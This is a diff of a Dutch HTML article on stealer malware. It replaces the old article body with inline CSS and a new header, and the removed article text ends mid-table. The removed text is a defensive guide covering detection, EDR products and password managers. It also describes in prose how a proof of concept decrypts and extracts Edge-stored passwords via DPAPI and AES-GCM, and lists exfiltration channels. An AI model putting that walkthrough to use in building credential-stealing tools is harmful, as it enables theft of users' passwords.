@@ -3,306 +3,1069 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Stealer Malware: Bescherm Je Gegevens Online</title>
-    <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&family=Montserrat:wght@700&display=swap" rel="stylesheet">
+    <title>Stealer Malware Research | Cybersecurity Onderzoek</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 50%, #16213e 100%);
+            color: #e1e1e1;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Header */
+        .header {
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 0;
+            position: relative;
+        }
+
+        .logo {
+            font-size: clamp(1.2rem, 4vw, 1.5rem);
+            font-weight: 700;
+            background: linear-gradient(45deg, #00ff88, #00ccff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .nav-links {
+            display: flex;
+            list-style: none;
+            gap: clamp(15px, 3vw, 30px);
+        }
+
+        .nav-links a {
+            color: #e1e1e1;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            position: relative;
+            font-size: clamp(0.8rem, 2vw, 1rem);
+        }
+
+        .nav-links a:hover {
+            color: #00ff88;
+        }
+
+        .nav-links a::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: linear-gradient(45deg, #00ff88, #00ccff);
+            transition: width 0.3s ease;
+        }
+
+        .nav-links a:hover::after {
+            width: 100%;
+        }
+
+        /* Mobile Menu Toggle */
+        .menu-toggle {
+            display: none;
+            flex-direction: column;
+            cursor: pointer;
+            padding: 5px;
+        }
+
+        .menu-toggle span {
+            width: 25px;
+            height: 3px;
+            background: #00ff88;
+            margin: 3px 0;
+            transition: 0.3s;
+        }
+
+        .menu-toggle.active span:nth-child(1) {
+            transform: rotate(-45deg) translate(-5px, 6px);
+        }
+
+        .menu-toggle.active span:nth-child(2) {
+            opacity: 0;
+        }
+
+        .menu-toggle.active span:nth-child(3) {
+            transform: rotate(45deg) translate(-5px, -6px);
+        }
+
+        /* Hero Section */
+        .hero {
+            padding: clamp(60px, 10vw, 120px) 0 clamp(40px, 8vw, 80px);
+            text-align: center;
+            position: relative;
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle at center, rgba(0, 255, 136, 0.1) 0%, transparent 70%);
+            pointer-events: none;
+        }
+
+        .hero h1 {
+            font-size: clamp(2rem, 8vw, 4rem);
+            margin-bottom: 20px;
+            background: linear-gradient(45deg, #ffffff, #00ff88, #00ccff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-weight: 800;
+        }
+
+        .hero p {
+            font-size: clamp(1rem, 3vw, 1.3rem);
+            max-width: 800px;
+            margin: 0 auto 40px;
+            opacity: 0.9;
+            padding: 0 20px;
+        }
+
+        .author-info {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+            margin-bottom: 40px;
+            flex-wrap: wrap;
+        }
+
+        .author-avatar {
+            width: clamp(50px, 10vw, 60px);
+            height: clamp(50px, 10vw, 60px);
+            border-radius: 50%;
+            background: linear-gradient(45deg, #00ff88, #00ccff);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: clamp(1.2rem, 4vw, 1.5rem);
+            flex-shrink: 0;
+        }
+
+        .author-details h3 {
+            font-size: clamp(1rem, 3vw, 1.1rem);
+            margin-bottom: 5px;
+        }
+
+        .author-details p {
+            color: #888;
+            font-size: clamp(0.8rem, 2.5vw, 0.9rem);
+        }
+
+        .tech-badges {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .tech-badge {
+            display: inline-block;
+            padding: clamp(6px, 2vw, 8px) clamp(12px, 3vw, 16px);
+            background: rgba(0, 255, 136, 0.1);
+            border: 1px solid rgba(0, 255, 136, 0.3);
+            border-radius: 20px;
+            color: #00ff88;
+            font-size: clamp(0.8rem, 2vw, 0.9rem);
+        }
+
+        /* Main Content */
+        .main-content {
+            padding: clamp(30px, 8vw, 60px) 0;
+        }
+
+        .content-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 30px;
+            align-items: start;
+        }
+
+        /* Table of Contents */
+        .toc {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 25px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            margin-bottom: 30px;
+            order: 1;
+        }
+
+        .toc h3 {
+            color: #00ff88;
+            margin-bottom: 20px;
+            font-size: clamp(1rem, 3vw, 1.1rem);
+        }
+
+        .toc ul {
+            list-style: none;
+        }
+
+        .toc li {
+            margin-bottom: 10px;
+        }
+
+        .toc a {
+            color: #ccc;
+            text-decoration: none;
+            font-size: clamp(0.8rem, 2.5vw, 0.9rem);
+            transition: all 0.3s ease;
+            display: block;
+            padding: 5px 0;
+        }
+
+        .toc a:hover {
+            color: #00ff88;
+            transform: translateX(10px);
+        }
+
+        /* Article Content */
+        .article {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: clamp(20px, 5vw, 40px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            order: 2;
+        }
+
+        .section {
+            margin-bottom: clamp(40px, 8vw, 60px);
+            padding-bottom: clamp(20px, 5vw, 40px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .section:last-child {
+            border-bottom: none;
+        }
+
+        .section h2 {
+            color: #00ff88;
+            font-size: clamp(1.5rem, 5vw, 2rem);
+            margin-bottom: 25px;
+            position: relative;
+            padding-left: clamp(15px, 4vw, 25px);
+        }
+
+        .section h2::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 4px;
+            height: clamp(20px, 5vw, 30px);
+            background: linear-gradient(45deg, #00ff88, #00ccff);
+            border-radius: 2px;
+        }
+
+        .section h3 {
+            color: #00ccff;
+            font-size: clamp(1.2rem, 4vw, 1.4rem);
+            margin: 30px 0 15px;
+        }
+
+        .section h4 {
+            color: #00ccff;
+            font-size: clamp(1rem, 3vw, 1.2rem);
+            margin: 20px 0 10px;
+        }
+
+        .section p {
+            margin-bottom: 20px;
+            font-size: clamp(0.9rem, 2.5vw, 1.05rem);
+        }
+
+        .section ul, .section ol {
+            margin: 20px 0 20px clamp(20px, 5vw, 30px);
+        }
+
+        .section li {
+            margin-bottom: 10px;
+            font-size: clamp(0.9rem, 2.5vw, 1rem);
+        }
+
+        /* Code Blocks */
+        .code-block {
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(0, 255, 136, 0.3);
+            border-radius: 10px;
+            padding: clamp(15px, 4vw, 20px);
+            margin: 20px 0;
+            font-family: 'Courier New', monospace;
+            overflow-x: auto;
+            font-size: clamp(0.8rem, 2vw, 0.9rem);
+            line-height: 1.4;
+        }
+
+        .code-block pre {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        /* Data Tables */
+        .table-container {
+            overflow-x: auto;
+            margin: 30px 0;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .data-table {
+            width: 100%;
+            min-width: 600px;
+            border-collapse: collapse;
+            background: rgba(0, 0, 0, 0.2);
+        }
+
+        .data-table th {
+            background: linear-gradient(45deg, #00ff88, #00ccff);
+            color: #000;
+            padding: clamp(10px, 3vw, 15px);
+            text-align: left;
+            font-weight: 600;
+            font-size: clamp(0.8rem, 2vw, 1rem);
+            white-space: nowrap;
+        }
+
+        .data-table td {
+            padding: clamp(10px, 3vw, 15px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            font-size: clamp(0.8rem, 2vw, 0.9rem);
+            vertical-align: top;
+        }
+
+        .data-table tr:hover {
+            background: rgba(0, 255, 136, 0.05);
+        }
+
+        /* Warning/Info Boxes */
+        .info-box {
+            background: rgba(0, 204, 255, 0.1);
+            border-left: 4px solid #00ccff;
+            padding: clamp(15px, 4vw, 20px);
+            margin: 20px 0;
+            border-radius: 5px;
+            font-size: clamp(0.9rem, 2.5vw, 1rem);
+        }
+
+        .warning-box {
+            background: rgba(255, 165, 0, 0.1);
+            border-left: 4px solid #ffa500;
+            padding: clamp(15px, 4vw, 20px);
+            margin: 20px 0;
+            border-radius: 5px;
+            font-size: clamp(0.9rem, 2.5vw, 1rem);
+        }
+
+        /* Floating Elements */
+        .floating-element {
+            position: fixed;
+            width: clamp(50px, 10vw, 100px);
+            height: clamp(50px, 10vw, 100px);
+            background: radial-gradient(circle, rgba(0, 255, 136, 0.1) 0%, transparent 70%);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: -1;
+            animation: float 6s ease-in-out infinite;
+        }
+
+        .floating-element:nth-child(1) { 
+            top: 20%; 
+            left: 5%; 
+            animation-delay: 0s; 
+        }
+        .floating-element:nth-child(2) { 
+            top: 60%; 
+            right: 5%; 
+            animation-delay: 2s; 
+        }
+        .floating-element:nth-child(3) { 
+            bottom: 20%; 
+            left: 10%; 
+            animation-delay: 4s; 
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
+            50% { transform: translateY(-20px) rotate(180deg); }
+        }
+
+        /* Smooth Scrolling */
+        html {
+            scroll-behavior: smooth;
+        }
+
+        /* Animations */
+        .section {
+            opacity: 0;
+            transform: translateY(30px);
+            animation: fadeInUp 0.8s ease forwards;
+        }
+
+        .section:nth-child(1) { animation-delay: 0.1s; }
+        .section:nth-child(2) { animation-delay: 0.2s; }
+        .section:nth-child(3) { animation-delay: 0.3s; }
+        .section:nth-child(4) { animation-delay: 0.4s; }
+        .section:nth-child(5) { animation-delay: 0.5s; }
+        .section:nth-child(6) { animation-delay: 0.6s; }
+        .section:nth-child(7) { animation-delay: 0.7s; }
+
+        @keyframes fadeInUp {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Responsive Breakpoints */
+        
+        /* Small tablets and large phones */
+        @media (min-width: 576px) {
+            .container {
+                padding: 0 30px;
+            }
+            
+            .author-info {
+                gap: 25px;
+            }
+        }
+
+        /* Medium tablets */
+        @media (min-width: 768px) {
+            .nav {
+                padding: 20px 0;
+            }
+            
+            .menu-toggle {
+                display: none !important;
+            }
+            
+            .content-grid {
+                grid-template-columns: 250px 1fr;
+                gap: 40px;
+            }
+            
+            .toc {
+                position: sticky;
+                top: 120px;
+                margin-bottom: 0;
+                order: 0;
+            }
+            
+            .article {
+                order: 0;
+            }
+            
+            .floating-element:nth-child(1) { left: 10%; }
+            .floating-element:nth-child(2) { right: 10%; }
+            .floating-element:nth-child(3) { left: 20%; }
+        }
+
+        /* Large tablets and small desktops */
+        @media (min-width: 992px) {
+            .content-grid {
+                gap: 60px;
+            }
+            
+            .hero {
+                padding: 120px 0 80px;
+            }
+            
+            .main-content {
+                padding: 60px 0;
+            }
+        }
+
+        /* Large screens */
+        @media (min-width: 1200px) {
+            .container {
+                padding: 0 40px;
+            }
+        }
+
+        /* Mobile-specific styles */
+        @media (max-width: 767px) {
+            .menu-toggle {
+                display: flex;
+            }
+            
+            .nav-links {
+                position: absolute;
+                top: 100%;
+                left: 0;
+                right: 0;
+                background: rgba(0, 0, 0, 0.95);
+                backdrop-filter: blur(20px);
+                flex-direction: column;
+                padding: 20px;
+                transform: translateY(-100%);
+                opacity: 0;
+                visibility: hidden;
+                transition: all 0.3s ease;
+                border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            }
+            
+            .nav-links.active {
+                transform: translateY(0);
+                opacity: 1;
+                visibility: visible;
+            }
+            
+            .nav-links li {
+                margin: 10px 0;
+            }
+            
+            .nav-links a {
+                font-size: 1.1rem;
+                padding: 10px 0;
+            }
+            
+            .hero p {
+                padding: 0 10px;
+            }
+            
+            .author-info {
+                flex-direction: column;
+                gap: 15px;
+            }
+            
+            .author-details {
+                text-align: center;
+            }
+            
+            .tech-badges {
+                padding: 0 10px;
+            }
+            
+            .section h2 {
+                padding-left: 20px;
+            }
+            
+            .section ul, .section ol {
+                margin-left: 25px;
+                padding-right: 10px;
+            }
+            
+            .code-block {
+                font-size: 0.75rem;
+            }
+            
+            .data-table {
+                min-width: 500px;
+            }
+            
+            .floating-element {
+                display: none;
+            }
+        }
+
+        /* Extra small devices */
+        @media (max-width: 480px) {
+            .container {
+                padding: 0 15px;
+            }
+            
+            .article {
+                padding: 15px;
+            }
+            
+            .toc {
+                padding: 20px;
+            }
+            
+            .data-table {
+                min-width: 450px;
+            }
+            
+            .code-block {
+                padding: 12px;
+                font-size: 0.7rem;
+            }
+        }
+
+        /* High DPI displays */
+        @media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
+            .section h2::before {
+                width: 3px;
+            }
+        }
+
+        /* Landscape orientation on mobile */
+        @media (max-width: 767px) and (orientation: landscape) {
+            .hero {
+                padding: 40px 0 30px;
+            }
+            
+            .hero h1 {
+                font-size: 2.5rem;
+            }
+            
+            .author-info {
+                flex-direction: row;
+                justify-content: center;
+            }
+        }
+    </style>
 </head>
 <body>
-    <header>
+    <!-- Floating background elements -->
+    <div class="floating-element"></div>
+    <div class="floating-element"></div>
+    <div class="floating-element"></div>
+
+    <!-- Header -->
+    <header class="header">
         <div class="container">
-            <h1>Bescherm Jezelf Tegen Stealer Malware: Een Diepgaande Gids</h1>
-            <p class="subtitle">Detectie, Preventie en Incident Response voor Digitale Veiligheid</p>
+            <nav class="nav">
+                <div class="logo">CyberSec Research</div>
+                <ul class="nav-links">
+                    <li><a href="#onderzoek">Onderzoek</a></li>
+                    <li><a href="#detectie">Detectie</a></li>
+                    <li><a href="#preventie">Preventie</a></li>
+                    <li><a href="#conclusie">Conclusie</a></li>
+                </ul>
+            </nav>
         </div>
     </header>
 
-    <main class="container">
-        <article>
-            <section class="intro">
-                <p>In het huidige digitale tijdperk is <strong>stealer malware</strong> een van de meest geniepige en effectieve bedreigingen. Deze kwaadaardige software is specifiek ontworpen om uw meest gevoelige digitale bezittingen te stelen: van inloggegevens en browsercookies tot financiële informatie en sessietokens. Dit artikel duikt diep in de wereld van stealer malware, van de minutieuze werking tot geavanceerde detectiemethoden, essentiële preventieve strategieën, en een robuuste incident response aanpak.</p>
-                <img src="images/stealer_malware_intro.jpg" alt="Illustratie van digitale diefstal of dataverlies" class="section-image">
-            </section>
-
-            <section>
-                <h2>Wat is Stealer Malware en Hoe Werkt Het?</h2>
-                <p>Stealer malware, kortweg 'stealer', is gespecialiseerde kwaadaardige software die persoonlijke en gevoelige informatie van uw computer exfiltreert. De primaire focus ligt vaak op data die opgeslagen is in webbrowsers, waar een schat aan waardevolle gegevens (wachtwoorden, cookies, autofill-data, creditcardgegevens) te vinden is. Maar hun capaciteiten strekken zich vaak uit tot VPN-gegevens, cryptocurrency wallets, en zelfs gaming-accounts.</p>
-
-                <h3>De Werking van Stealer Malware: Een Proof-of-Concept in de Praktijk</h3>
-                <p>Om de mechaniek van een stealer te demystificeren, hebben we een <a href="main.py" target="_blank">Proof-of-Concept (POC)</a> ontwikkeld die demonstreert hoe wachtwoorden uit Microsoft Edge kunnen worden gestolen. Dit proces illustreert hoe aanvallers met relatief eenvoudige stappen toegang kunnen krijgen tot uw meest beschermde data:</p>
-                <ol>
-                    <li>
-                        <h4>1. Encryptiesleutel Ophalen (DPAPI)</h4>
-                        <p>Microsoft Edge, net als andere Chromium-gebaseerde browsers, slaat wachtwoorden versleuteld op. De sleutel voor deze versleuteling bevindt zich in het 'Local State' bestand van de browser, zelf beveiligd met Windows DPAPI (Data Protection Application Programming Interface). Onze POC bootst na hoe een aanvaller deze sleutel ontsleutelt met behulp van ingebouwde Windows-functies, vaak zonder extra beheerdersrechten.</p>
-                    </li>
-                    <li>
-                        <h4>2. Database Kopiëren en Openen</h4>
-                        <p>De versleutelde wachtwoorden zijn opgeslagen in een SQLite-database genaamd 'Login Data'. Aangezien deze database mogelijk in gebruik is door de browser, maakt de stealer een tijdelijke kopie. Dit voorkomt conflicten en stelt de malware in staat de database ongestoord te benaderen en te parsen.</p>
-                    </li>
-                    <li>
-                        <h4>3. Wachtwoorden Ontsleutelen (AES-GCM)</h4>
-                        <p>Na het ophalen van de versleutelde wachtwoorden uit de database, gebruikt de stealer de eerder verkregen encryptiesleutel in combinatie met AES-GCM (Authenticated Encryption with Associated Data - Galois/Counter Mode) om de wachtwoorden te ontsleutelen. Dit resulteert in leesbare inloggegevens.</p>
-                    </li>
-                    <li>
-                        <h4>4. Data Exfiltratie: De Buit Verzamelen</h4>
-                        <p>Hoewel onze POC de ontsleutelde wachtwoorden lokaal toont, is het cruciale laatste stadium in een echte aanval het exfiltreren van de data. Dit gebeurt meestal via onopvallende kanalen zoals HTTP(S)-verzoeken naar een Command & Control (C2) server, Telegram/Discord webhooks (waarbij de gestolen data via populaire messaging platforms wordt verstuurd), e-mail, of upload naar clouddiensten. Aanvallers kiezen vaak voor methoden die netwerkmonitoring kunnen omzeilen.</p>
-                    </li>
-                </ol>
-                <img src="images/poc_workflow.png" alt="Diagram van stealer malware POC workflow: sleutel, database, decryptie, exfiltratie" class="section-image">
-                <p class="note">Deze POC toont aan dat stealer malware met relatief minimale inspanning en zonder noodzakelijke beheerdersrechten gevoelige informatie kan stelen door slim gebruik te maken van bestaande systeemfuncties en browserarchitecturen.</p>
-
-                <h3>Herkenbare Patronen in Stealer Malware</h3>
-                <p>Ondanks hun diversiteit vertonen veel stealer varianten gemeenschappelijke kenmerken die kunnen helpen bij detectie:</p>
-                <ul>
-                    <li><strong>"Living off the Land" (LotL):</strong> Gebruik van legitieme systeemtools (PowerShell, cmd.exe, wscript.exe) om detectie te omzeilen en de aanval minder verdacht te maken.</li>
-                    <li><strong>Brede Targeting:</strong> Ze richten zich op een scala aan applicaties, waaronder webbrowsers (Chrome, Firefox, Edge, Brave), VPN-clients (OpenVPN, AnyDesk, TeamViewer), cryptowallets (Metamask, Exodus, Trust Wallet), en gamingplatforms (Steam, Epic Games).</li>
-                    <li><strong>Geavanceerde Obfuscatie:</strong> Code is vaak zwaar geobfusceerd of versleuteld om statische analyse te bemoeilijken. Payloads worden vaak pas in het geheugen gedecrypteerd.</li>
-                    <li><strong>Diverse Exfiltratiemethoden:</strong> Naast HTTP(S) naar C2-servers, zien we een toename van Telegram-bots en Discord-webhooks voor het direct dumpen van gestolen data. Dit maakt monitoring complexer.</li>
-                    <li><strong>Snelle Executie en Self-Delete:</strong> Veel stealers zijn ontworpen om snel hun taak uit te voeren en zichzelf vervolgens te verwijderen of sporen te wissen om forensische analyse te bemoeilijken.</li>
-                    <li><strong>"Malware-as-a-Service" (MaaS):</strong> De markt voor stealers is gecommodificeerd. Stealers zoals Raccoon Stealer, RedLine, Vidar, en Lumma worden vaak aangeboden als diensten, inclusief C2-panelen en support voor cybercriminelen met weinig technische kennis.</li>
-                </ul>
-            </section>
-
-            <section>
-                <h2>Detectie van Geavanceerde Stealer Malware</h2>
-                <p>De obfuscatie- en encryptietechnieken die door stealer malware worden gebruikt, maken detectie een uitdaging. Een gelaagde aanpak is essentieel.</p>
-
-                <h3>Analyse van Malware: Statisch vs. Dynamisch</h3>
-                <ul>
-                    <li><strong>Statische Analyse:</strong> Het onderzoeken van de code zonder deze uit te voeren. Tools zoals Ghidra (reverse engineering), dnSpy (voor .NET binaries), of tekenreeksen-analyse (strings) zoeken naar patronen zoals API-aanroepen (bijv. <code>CryptUnprotectData</code>), encryptieroutines (AES, RSA), en Base64-decodering. Deze methode is effectief tegen bekende signaturen.</li>
-                    <li><strong>Dynamische Analyse:</strong> Het uitvoeren van de malware in een gecontroleerde, geïsoleerde omgeving (een 'sandbox' of virtuele machine) om het gedrag te observeren. Dit omvat monitoring van bestandsactiviteit (toegang tot 'Login Data' bestanden), netwerkcommunicatie (ongewone uitgaande verbindingen, DNS-queries), procesinjectie, en geheugendumps om onversleutelde payloads te vangen.</li>
-                </ul>
-                <img src="images/malware_analysis.png" alt="Illustratie van statische en dynamische malware analyse" class="section-image">
-
-                <h3>Geavanceerde Detectiehulpmiddelen</h3>
-                <p>Beveiligingsteams maken gebruik van gespecialiseerde tooling om verborgen of versleutelde malware op te sporen:</p>
-                <ul>
-                    <li><strong>YARA-regels:</strong> Dit zijn patroonherkenningsregels die worden gebruikt om malwarefamilies te identificeren op basis van binaire of tekstuele signaturen in bestanden of geheugen.</li>
-                    <li><strong>Memory-analyse:</strong> Tools zoals Volatility Framework analyseren het vluchtige geheugen (RAM) van een systeem om running processes, geïnjecteerde code, en ontsleutelde payloads te detecteren die inactief blijven op schijf.</li>
-                    <li><strong>Gedragsanalyse en Logbestanden:</strong> Monitoring van afwijkend systeemgedrag (bijv. een onbekend proces dat gevoelige browserbestanden leest, of een proces dat onverwacht DPAPI-functies aanroept) via SIEM-systemen (Security Information and Event Management) en uitgebreide logging.</li>
-                </ul>
-            </section>
-
-            <section>
-                <h2>Detectiemethoden: De Kracht van EDR-oplossingen</h2>
-                <p>Endpoint Detection and Response (EDR)-oplossingen zijn de voorhoede in de strijd tegen geavanceerde bedreigingen zoals stealer malware. Ze bieden diepgaande zichtbaarheid en controle over endpoints.</p>
-
-                <h3>Vergelijking van Toonaangevende EDR-oplossingen</h3>
-                <p>Hieronder een overzicht van populaire EDR-oplossingen en hun specifieke voordelen tegen stealer malware:</p>
-                <div class="table-responsive">
-                    <table>
-                        <thead>
-                            <tr>
-                                <th>EDR-oplossing</th>
-                                <th>Sterke punten t.o.v. Stealer Malware</th>
-                                <th>Zwakke punten / Aandachtspunten</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            <tr>
-                                <td><strong>Microsoft Defender for Endpoint</strong></td>
-                                <td>
-                                    <ul>
-                                        <li>Naadloze integratie met Windows OS en Microsoft 365 Ecosysteem.</li>
-                                        <li>Uitstekende detectie van DPAPI-misbruik en toegang tot browser-databasebestanden (Edge/Chrome).</li>
-                                        <li>Rijke telemetrie en geavanceerde jachtmogelijkheden via de Microsoft 365 Defender portal.</li>
-                                    </ul>
-                                </td>
-                                <td>
-                                    <ul>
-                                        <li>Minder robuust op niet-Windows endpoints (macOS, Linux), hoewel functionaliteit verbetert.</li>
-                                        <li>Kan veel resources verbruiken op oudere systemen.</li>
-                                    </ul>
-                                </td>
-                            </tr>
-                            <tr>
-                                <td><strong>CrowdStrike Falcon</strong></td>
-                                <td>
-                                    <ul>
-                                        <li>Gedragsgebaseerde detectie met focus op "indicators of attack" (IOAs), zeer effectief tegen fileless en script-based stealers.</li>
-                                        <li>Lichtgewicht agent met minimale impact op prestaties.</li>
-                                        <li>Sterke cloudgebaseerde AI/ML-analyse voor snelle dreigingsidentificatie.</li>
-                                    </ul>
-                                </td>
-                                <td>
-                                    <ul>
-                                        <li>Soms minder transparantie in de exacte detectielogica door het "black box" karakter van AI.</li>
-                                        <li>Kan kostbaar zijn voor kleinere organisaties.</li>
-                                    </ul>
-                                </td>
-                            </tr>
-                            <tr>
-                                <td><strong>SentinelOne Singularity</strong></td>
-                                <td>
-                                    <ul>
-                                        <li>Autonome AI-gebaseerde detectie en actie, inclusief geautomatiseerde rollback van kwaadaardige veranderingen.</li>
-                                        <li>Uitstekend in het herkennen van anomalieën in bestands- en netwerkgedrag, en het detecteren van injectietechnieken.</li>
-                                        <li>Detecteert proactief veel stealer-specifieke technieken (bijv. toegang tot credential stores).</li>
-                                    </ul>
-                                </td>
-                                <td>
-                                    <ul>
-                                        <li>Potentiële false positives bij zeer specifieke, onbekende custom scripts.</li>
-                                        <li>Leercurve voor het optimaliseren van beleid.</li>
-                                    </ul>
-                                </td>
-                            </tr>
-                            <tr>
-                                <td><strong>Sophos Intercept X</strong></td>
-                                <td>
-                                    <ul>
-                                        <li>Combinatie van signature-based en gedragstechnieken, inclusief anti-exploit en anti-ransomware mogelijkheden.</li>
-                                        <li>Herkenning van veelgebruikte API-aanroepen en bestandsgedrag gerelateerd aan stealer-operaties.</li>
-                                        <li>Zeer bruikbaar voor MKB-omgevingen door gebruiksgemak.</li>
-                                    </ul>
-                                </td>
-                                <td>
-                                    <ul>
-                                        <li>Minder diepgaande "threat hunting" mogelijkheden zonder de uitgebreide XDR-extensie.</li>
-                                        <li>Kan soms trager zijn in de reactie op nul-dag dreigingen dan puur gedragsgebaseerde EDR's.</li>
-                                    </ul>
-                                </td>
-                            </tr>
-                            <tr>
-                                <td><strong>Bitdefender GravityZone</strong></td>
-                                <td>
-                                    <ul>
-                                        <li>Robuuste sandboxing en gedragsdetectie, met focus op bescherming tegen geavanceerde dreigingen.</li>
-                                        <li>Effectief in het herkennen van de extractie van browserdata en toegang tot credential stores.</li>
-                                        <li>Centraal management platform voor diverse beveiligingslagen.</li>
-                                    </ul>
-                                </td>
-                                <td>
-                                    <ul>
-                                        <li>De gebruikersinterface kan als complex worden ervaren door teams met minder diepgaande securitykennis.</li>
-                                        <li>Integratie met niet-Bitdefender producten kan uitdagend zijn.</li>
-                                    </ul>
-                                </td>
-                            </tr>
-                        </tbody>
-                    </table>
-                </div>
-                <img src="images/edr_comparison.png" alt="Illustratie van EDR-oplossingen in actie of vergelijkende grafiek" class="section-image">
-                <p>Deze EDR-oplossingen bieden gezamenlijk een robuuste verdedigingslinie tegen de typische stealer malware tactieken, zoals pogingen tot toegang tot 'Login Data' bestanden, misbruik van Windows DPAPI, onverwachte netwerkactiviteit (exfiltratie), en de aanwezigheid van encryptie- of decryptieroutines in onbekende processen.</p>
-            </section>
-
-            <section>
-                <h2>Preventieve Maatregelen: Wachtwoordmanagers als Eerste Verdediging</h2>
-                <p>Naast technische detectie is proactieve preventie cruciaal. Het gebruik van "goede" wachtwoordmanagers is een van de meest effectieve preventieve maatregelen tegen credential harvesting door stealers.</p>
-
-                <h3>Criteria voor de Selectie van Wachtwoordmanagers</h3>
-                <p>Bij het evalueren van wachtwoordmanagers hebben we gekeken naar de volgende kritische aspecten:</p>
-                <ul>
-                    <li><strong>Beveiligingseisen:</strong> Sterke encryptie (minimaal AES-256), robuuste multi-factor authenticatie (MFA), en gedetailleerd toegangsbeheer (bijv. role-based access control).</li>
-                    <li><strong>Naleving van Wet- en Regelgeving:</strong> Voldoet de oplossing aan belangrijke standaarden zoals AVG (GDPR), BIO (Baseline Informatiebeveiliging Overheid), en de NIS2-richtlijn? Dit omvat gegevensminimalisatie, privacy by design, transparantie over gegevensverwerking en auditmogelijkheden.</li>
-                    <li><strong>Integratiemogelijkheden:</strong> Hoe goed integreert de manager met bestaande IT-infrastructuren (bijv. Active Directory voor Single Sign-On), browsers en mobiele apparaten?</li>
-                    <li><strong>Gebruiksvriendelijkheid:</strong> Een intuïtieve interface die minimale training vereist voor eindgebruikers is essentieel voor adoptie.</li>
-                    <li><strong>Prijs:</strong> Een vergelijking van abonnementsmodellen en licentiekosten per gebruiker.</li>
-                    <li><strong>"Breached" Geschiedenis:</strong> Het trackrecord van de leverancier met betrekking tot datalekken; een geschiedenis van herhaalde of ernstige inbreuken is een rode vlag.</li>
-                </ul>
-
-                <h3>Vergelijking van Toonaangevende Wachtwoordmanagers</h3>
-                <div class="table-responsive">
-                    <table>
-                        <thead>
-                            <tr>
-                                <th>WachtwoordManager</th>
-                                <th>Beveiliging</th>
-                                <th>Voldoet aan NIS2/AVG</th>
-                                <th>Integratie (SSO/AD)</th>
-                                <th>Gebruikersvriendelijkheid</th>
-                                <th>Prijs (PM)</th>
-                                <th>Breached</th>
-                                <th>Notities</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            <tr>
-                                <td><strong>LastPass Business</strong></td>
-                                <td>AES-256, MFA, Toegangsbeheer</td>
-                                <td>Ja</td>
-                                <td>Ja, SSO, AD</td>
-                                <td>Minimale training</td>
-                                <td>€5.20</td>
-                                <td>2</td>
-                                <td>Diverse datalekken in het verleden; herstelde vertrouwen is cruciaal.</td>
-                            </tr>
-                            <tr>
-                                <td><strong>1Password Business</strong></td>
-                                <td>AES-256, MFA, Toegangsbeheer</td>
-                                <td>Ja</td>
-                                <td>Ja, SSO, AD</td>
-                                <td>Standaard training</td>
-                                <td>€7.99</td>
-                                <td>0</td>
-                                <td>Sterke reputatie op het gebied van beveiliging en privacy.</td>
-                            </tr>
-                            <tr>
-                                <td><strong>Keeper Security</strong></td>
-                                <td>AES-256, MFA, Toegangsbeheer</td>
-                                <td>Ja, beperkt</td>
-                                <td>Ja, beperkt</td>
-                                <td>Standaard training</td>
-                                <td>€2.99</td>
-                                <td>0 (wel indirect gelinkt aan een bijna-breach bij een klant)</td>
-                                <td>Meer gericht op MKB; focus op robuuste beveiliging, maar minder soepele enterprise integraties.</td>
-                            </tr>
-                            <tr>
-                                <td><strong>MindYourPass</strong></td>
-                                <td>AES-256, MFA, Toegangsbeheer, Rollen</td>
-                                <td>Ja</td>
-                                <td>Ja, SSO, AD</td>
-                                <td>Minimaal tot geen training</td>
-                                <td>€5.50</td>
-                                <td>0</td>
